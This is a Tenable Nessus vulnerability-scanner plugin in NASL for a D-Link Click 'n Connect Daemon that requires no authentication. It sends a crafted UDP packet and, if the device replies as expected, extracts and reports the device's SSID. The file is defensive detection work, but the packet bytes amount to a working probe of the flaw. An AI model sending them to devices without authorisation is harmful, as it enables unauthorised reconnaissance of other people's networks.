#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) 
{

  script_id(47606);
  script_version("$Revision: 1.5 $");
  script_cvs_date("$Date: 2015/09/24 21:08:38 $");

  script_bugtraq_id(41187);

  script_name(english:"D-Link DCC Protocol Security Bypass");
  script_summary(english:"Attempts to retrieve the device's SSID"); 
 
  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote network service is affected by a security bypass
vulnerability."
  );
  script_set_attribute(
    attribute:"description", 
    value:
"The remote D-link Click 'n Connect Daemon does not implement any
authentication and therefore allows remote attackers to view
configuration and control server functions via the affected service."
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.icysilence.org/?p=413"
  );
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.securityfocus.com/archive/1/512053"
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Unknown at this time."
  );
 script_set_cvss_base_vector("CVSS2#AV:A/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"vuln_publication_date",value:"2010/06/28");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/07/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();
 
  script_category(ACT_GATHER_INFO);
  script_family(english:"Misc.");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("dlink_dccd_detect.nasl");
  script_require_keys("Services/udp/dlink_dccd");
  script_require_udp_ports("Services/udp/dlink_dccd", 2003);

  exit(0);

}

include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");

port = get_kb_item("Services/udp/dlink_dccd");
if (!port) port = 2003;

if (!get_udp_port_state(port)) exit(0, "UDP port "+port+" is not open."); 

soc = open_sock_udp(port);
if (!soc) exit(1, "Failed to open a socket on UDP port "+port+"."); 

# 03 00 00 00 00 00 00 00 21 27 00 0a
dccd_ssid_req  = mkbyte(0x03) + mkbyte(0x00) + mkbyte(0x00) + mkbyte(0x00) + mkbyte(0x00) + mkbyte(0x00) + mkbyte(0x00) + mkbyte(0x00) + mkbyte(0x21) + mkbyte(0x27) + mkbyte(0x00) + mkbyte(0x0a);

# 03 00 00 00 00 00 01 00 21 27 21 00
dccd_ssid_recv = mkbyte(0x03) + mkbyte(0x00) + mkbyte(0x00) + mkbyte(0x00) + mkbyte(0x00) + mkbyte(0x00) + mkbyte(0x01) + mkbyte(0x00) + mkbyte(0x21) + mkbyte(0x27) + mkbyte(0x21) + mkbyte(0x00);

# we send 'dccd_ssid_req', we expect to receive 'dccd_ssid_recv'
send(socket:soc, data:dccd_ssid_req);

ssid_data = recv(socket:soc, length:1024, min:128);
if (strlen(ssid_data) == 0) exit(0, "The DCCD service listening on UDP port "+port+" did not respond.");
  
if (dccd_ssid_recv >< ssid_data)
{
  if (report_verbosity > 0)
  {
    ssid = substr(ssid_data, 12, strlen(ssid_data)-1);
    ssid = str_replace(string:ssid, find:'\x00', replace:"");

    report = '\nNessus was able to exploit the vulnerability to retrieve the remote' +
             '\n' + "device's SSID : " + 
             '\n' +
             '\n' + ssid + '\n';
    security_hole(port:port, proto:"udp", extra:report);
  }
  security_hole(port:port, proto:"udp");
}
else exit(0, "D-link DCCD service doesn't seem to be vulnerable.");
